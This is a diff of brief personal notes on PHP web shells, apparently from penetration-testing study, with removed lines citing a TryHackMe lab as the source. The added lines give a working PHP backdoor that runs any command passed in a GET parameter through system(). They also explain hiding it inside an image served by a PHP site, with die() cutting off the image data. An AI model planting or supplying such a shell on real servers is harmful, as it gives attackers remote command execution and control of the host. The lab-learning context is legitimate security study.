@@ -1,16 +1,15 @@
 # php webshells
 
-TODO
-> php site using php to show images
+
+> php site using php to show images, we can hide an shell in an image
 ```php
-if isset {
-	echo "<pre>".shell.exec($cmd)."</pre>";
+if(isset($_GET['invae']  ))
+{
+	system($_GET['invae']);
 }
 die(); 
 ```
 `die()` removes the image garbage, making our shell easier to use
 
 
-above `isset` block has semantic err? need the "what" of isset, what is set ? 
-source of the above is from THM wreath room
 
